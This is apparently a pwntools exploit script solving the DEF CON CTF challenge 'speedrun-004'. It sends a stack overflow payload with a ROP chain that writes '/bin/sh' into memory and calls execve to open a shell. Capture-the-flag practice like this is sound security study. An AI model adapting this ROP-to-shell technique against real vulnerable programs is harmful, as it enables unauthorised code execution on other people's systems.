#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template speedrun-004
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('speedrun-004')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
brva 0x0baf
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

ret = p64(0x400416)
# 0x0000000000400686 : pop rdi ; ret
pop_rdi = p64(0x400686)
# 0x0000000000410a93 : pop rsi ; ret
pop_rsi = p64(0x410a93)
# 0x000000000044a155 : pop rdx ; ret
pop_rdx = p64(0x44a155)
# 0x0000000000415f04 : pop rax ; ret
pop_rax = p64(0x415f04)
# 0x000000000048d301 : mov qword ptr [rax], rdx ; ret
mov_rdx = p64(0x48d301)
# 0x000000000040132c : syscall
syscall = p64(0x40132c)
# 0x6b6000           0x6bc000 rw-p     6000 b6000  /home/kali/Desktop/c4ptur3_th3_fl4g/nightmare/Defcon/speedrun4/speedrun-004
# 0x6b6000:       0x02ba7a01bb0b01ff      0xffff000005038700
# 0x6b6010:       0x039d01b201d30c01      0xffff00000503ed00
# 0x6b6020:       0x05d702a103870c01      0x000000000506a400
# 0x6b6030:       0x0000000000000000      0x0000000000000000
address = 0x6b6030
binsh = p64(0x0068732f6e69622f)

io = start()

io.recvuntil(b"have to say?")
payload = b"257".ljust(9, b"\x00")
io.sendline(payload)
io.recvline()

ropchain = b""
ropchain += pop_rax
ropchain += p64(address)
ropchain += pop_rdx
ropchain += binsh
ropchain += mov_rdx

ropchain += pop_rax
ropchain += p64(0x3b)
ropchain += pop_rdi
ropchain += p64(address)
ropchain += pop_rsi
ropchain += p64(0x0)
ropchain += pop_rdx
ropchain += p64(0x0)
ropchain += syscall

payload = b"\x00"*15
payload += ret * ((256 - len(payload) - len(ropchain)) // 8) + ropchain
payload = payload.ljust(257, b"\x00")

io.sendline(payload)

io.interactive()

